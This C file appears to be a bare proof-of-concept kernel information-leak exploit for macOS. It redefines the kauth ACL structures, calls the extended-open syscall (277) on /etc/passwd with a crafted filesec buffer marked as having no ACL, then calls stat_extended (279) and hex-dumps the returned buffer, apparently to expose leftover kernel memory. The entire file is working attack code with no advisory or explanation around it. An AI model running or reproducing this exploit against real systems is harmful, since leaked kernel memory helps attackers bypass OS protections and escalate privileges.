#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/kauth.h>
#include <sys/kernel_types.h>


void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

typedef u_int32_t kauth_ace_rights_t;

/* Access Control List Entry (ACE) */
struct kauth_ace {
    guid_t      ace_applicable;
    u_int32_t   ace_flags;
#define KAUTH_ACE_KINDMASK      0xf
#define KAUTH_ACE_PERMIT        1
#define KAUTH_ACE_DENY          2
#define KAUTH_ACE_AUDIT         3   /* not implemented */
#define KAUTH_ACE_ALARM         4   /* not implemented */
#define KAUTH_ACE_INHERITED     (1<<4)
#define KAUTH_ACE_FILE_INHERIT      (1<<5)
#define KAUTH_ACE_DIRECTORY_INHERIT (1<<6)
#define KAUTH_ACE_LIMIT_INHERIT     (1<<7)
#define KAUTH_ACE_ONLY_INHERIT      (1<<8)
#define KAUTH_ACE_SUCCESS       (1<<9)  /* not implemented (AUDIT/ALARM) */
#define KAUTH_ACE_FAILURE       (1<<10) /* not implemented (AUDIT/ALARM) */
/* All flag bits controlling ACE inheritance */
#define KAUTH_ACE_INHERIT_CONTROL_FLAGS     \
        (KAUTH_ACE_FILE_INHERIT |   \
         KAUTH_ACE_DIRECTORY_INHERIT |  \
         KAUTH_ACE_LIMIT_INHERIT |  \
         KAUTH_ACE_ONLY_INHERIT)
    kauth_ace_rights_t ace_rights;      /* scope specific */
    /* These rights are never tested, but may be present in an ACL */
#define KAUTH_ACE_GENERIC_ALL       (1<<21)
#define KAUTH_ACE_GENERIC_EXECUTE   (1<<22)
#define KAUTH_ACE_GENERIC_WRITE     (1<<23)
#define KAUTH_ACE_GENERIC_READ      (1<<24)

};


struct kauth_acl {
    u_int32_t   acl_entrycount;
    u_int32_t   acl_flags;

    struct kauth_ace acl_ace[1];
};

#define KAUTH_FILESEC_MAGIC 0x012cc16d
#define KAUTH_FILESEC_NOACL ((u_int32_t)(-1))
#define fsec_entrycount fsec_acl.acl_entrycount

struct kauth_filesec {
    u_int32_t   fsec_magic;
#define KAUTH_FILESEC_MAGIC 0x012cc16d
    guid_t      fsec_owner;
    guid_t      fsec_group;

    struct kauth_acl fsec_acl;
};

// open_extended
// mkfifo_extended
// chmod_extended
// fchmod_extended
// mkdir_extended
// umask_extended
void allocation(char *path){
	struct kauth_filesec *xsecurity = malloc(0x100);
	memset(xsecurity, 0, 0x100);
	
	xsecurity->fsec_magic = KAUTH_FILESEC_MAGIC;
	xsecurity->fsec_entrycount = KAUTH_FILESEC_NOACL;

	if(syscall(277, path, O_RDONLY, KAUTH_UID_NONE, KAUTH_GID_NONE, 0, xsecurity) < 0){
		printf("allocation\n");
		perror("allocation");
	}

}

// stat
// stat64
// fstat
// fstat64
// lstat
// lstat64
void leak(char *path){
	struct stat stats;
	size_t xsecurity_len = 0x100;
	char *xsecurity = malloc(xsecurity_len);
	memset(xsecurity, 0, xsecurity_len);
	// 	stat_extended =  279
	if(syscall(279, path, &stats, xsecurity, &xsecurity_len) < 0){
		perror("stat_extended");
	}
	
	// log xsecurity
	DumpHex(xsecurity, xsecurity_len);
}

int main(){
	allocation("/etc/passwd");
	leak("/etc/passwd");
}

